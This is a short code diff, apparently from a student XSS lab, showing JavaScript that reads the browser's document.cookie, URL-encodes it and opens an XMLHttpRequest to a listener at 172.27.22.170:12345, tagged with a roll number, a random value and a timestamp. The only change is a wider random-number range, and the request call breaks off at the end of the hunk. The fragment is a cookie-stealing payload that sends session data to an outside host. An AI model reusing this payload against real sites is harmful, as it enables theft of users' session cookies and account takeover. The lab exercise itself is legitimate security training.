@@ -7,7 +7,7 @@ var req = new XMLHttpRequest();
 var ip        = "172.27.22.170:12345";
 var cookie    = encodeURIComponent(document.cookie);
 var rollno    = "13265";
-var random    = Math.floor((Math.random() * 1000) + 1);
+var random    = Math.floor((Math.random() * 1000000) + 1);
 var timestamp = Date.now();
 req.open(
     "GET", 
